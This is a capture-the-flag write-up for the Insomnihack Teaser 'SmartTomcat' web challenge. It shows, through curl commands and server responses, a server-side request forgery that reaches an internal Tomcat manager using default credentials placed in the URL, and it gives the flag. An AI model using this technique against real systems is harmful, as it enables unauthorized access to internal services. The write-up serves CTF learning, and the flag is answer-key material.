### Web50 SmartTomcat APP

Hello everyone, I will share you my SmartTomcat Solution for the Insomnihack Teaser CTF ..

First, this is a web challenge, 50pts, should be fast !

Some time spend on thhis application, the goal is to find the good coordianates to reach the "cat" position.

btw, look at this horrible cat :

![smartcat](/public/images/smartcat.jpg)

We can enter coordinates in the top fields :

![smartcat_ss](/public/images/smartcat_ss.png)

We looked at the network console then we find this : 

```
Request URL:http://smarttomcat.teaser.insomnihack.ch/index.php
Request Method:POST
Status Code:200 OK
Remote Address:54.76.71.37:80

Form-Data:
	u=http://localhost:8080/index.jsp?x=1337&y=1337
```

We see that the actual server is going to work with an other service on port 8080.

Timeout response when you try this :

```
curl -v 'http://smarttomcat.teaser.insomnihack.ch:8080/index.jsp?x=1337&y=1337'
```

.jsp ( and challenge name ) make us think about a tomcat app.. So we tried to access the manager url :

```
$ curl -i -X POST 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://127.0.0.1:8080/manager"                                                                                                                                  0|15:18:21

HTTP/1.1 200 OK
Date: Mon, 23 Jan 2017 14:18:24 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 195
Connection: keep-alive
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html>
<head>
<meta http-equiv="refresh" content="0; url=http://127.0.0.1:8080/manager/html/" />
</head>
<body>
<p><a href="http://127.0.0.1:8080/manager/html/">Redirect</a></p>
</body>
</html>
```

Redirecting on /manager/html, let's try it !

```
$ curl -i -X POST 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://127.0.0.1:8080/manager/html"                                                                                                                             0|15:19:26

HTTP/1.1 200 OK
Date: Mon, 23 Jan 2017 14:19:29 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 969
Connection: keep-alive
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 401 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>This request requires HTTP authentication.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>
```

401 Response ! we need credz .. can't event control the HTTP header because the index.php is doing the request.

The goal was just to put the credz in the url like this :

```
$ curl -i -X POST 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data-urlencode "u=http://tomcat:tomcat@127.0.0.1:8080/manager/html"                                                                                                               0|15:21:03

HTTP/1.1 200 OK
Date: Mon, 23 Jan 2017 14:21:10 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 91
Connection: keep-alive
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
```

The flag is  : `INS{th1s_is_re4l_w0rld_pent3st}`
